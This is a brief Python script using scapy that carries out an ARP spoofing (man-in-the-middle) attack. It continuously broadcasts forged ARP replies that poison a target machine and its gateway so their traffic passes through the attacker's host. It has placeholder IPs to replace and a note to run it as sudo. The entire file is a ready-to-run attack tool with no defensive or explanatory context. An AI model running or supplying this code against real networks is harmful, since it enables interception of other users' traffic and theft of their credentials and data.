from scapy.all import ARP, Ether, sendp
# need's to be run as sudo for interface priliges..
interface = "wlo1"

def perform_arp_spoofing(target_ip, gateway_ip):
    while True:
        # Craft ARP response to redirect traffic through the attacker
        arp_response_target = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", pdst=target_ip, psrc=gateway_ip)
        arp_response_gateway = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", pdst=gateway_ip, psrc=target_ip)

        # Send ARP responses
        sendp(arp_response_target, iface= interface)
        sendp(arp_response_gateway, iface=interface)

# Replace these with the appropriate IP addresses
target_ip = "192.168.1.2"  # IP of the target machine
gateway_ip = "192.168.1.1"  # IP of the gateway/router

perform_arp_spoofing(target_ip, gateway_ip)